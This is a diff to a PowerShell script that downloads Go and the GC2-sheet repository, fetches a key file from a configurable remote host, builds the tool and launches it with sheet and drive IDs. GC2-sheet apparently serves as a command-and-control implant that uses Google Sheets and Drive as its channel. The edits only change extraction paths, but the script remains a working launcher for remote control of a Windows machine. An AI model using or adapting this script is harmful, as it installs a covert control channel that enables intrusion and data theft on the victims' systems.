@@ -16,7 +16,8 @@ cd $env:userprofile\Downloads
 
 # Download and extract Go
 Invoke-WebRequest -Uri "https://go.dev/dl/go1.21.12.windows-amd64.zip" -OutFile "go.zip"
-Expand-Archive -Path "go.zip" -DestinationPath "$env:userprofile"
+Expand-Archive .\go.zip
+mv .\go $env:userprofile
 Remove-Item -Path "go.zip" -Force
 
 # Add Go to the PATH
@@ -24,11 +25,11 @@ $env:PATH += ";$env:userprofile\go\go\bin"
 
 # Download and extract the GC2-sheet repository
 Invoke-WebRequest -Uri "https://github.com/looCiprian/GC2-sheet/archive/refs/heads/master.zip" -OutFile "master.zip"
-Expand-Archive -Path "master.zip" -DestinationPath "$env:userprofile\Downloads"
+Expand-Archive .\master.zip
 Remove-Item -Path "master.zip" -Force
 
 # Change to the GC2-sheet directory
-cd "$env:userprofile\Downloads\GC2-sheet-master"
+cd "$env:userprofile\Downloads\master\GC2-sheet-master"
 
 # Download the key file
 Invoke-WebRequest -Uri "http://$myUrl/$myKey" -UseBasicParsing -OutFile "$myKey"
@@ -38,3 +39,4 @@ go build gc2-sheet.go
 
 # Run the gc2-sheet executable with the specified parameters
 .\gc2-sheet -k $myKey -s $mySheetId -d $myDriveId
+
